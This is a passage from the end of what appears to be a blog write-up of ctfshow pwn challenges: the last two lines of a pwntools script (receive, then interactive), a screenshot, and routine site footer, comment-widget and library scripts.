</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn/image-20250312193736349.png"
	width="1347"
	height="183"
	srcset="/p/ctfshow-pwn/image-20250312193736349_hu_e8364d2fc7a64f60.png 480w, /p/ctfshow-pwn/image-20250312193736349_hu_b42269d9d931d007.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="736"
		data-flex-basis="1766px"
	
></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            最后更新于 Mar 23, 2025 01:18 &#43;0800
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.body, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="Frederick2313072/utterances-comments"
        issue-term="pathname"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2024 - 
        
        2025 Frederick
    </section>
    
    <section class="powerby">
        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<style>
  body {
    background: url(https://Frederick2313072.github.io/background/background.jpg) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

    </body>
</html>
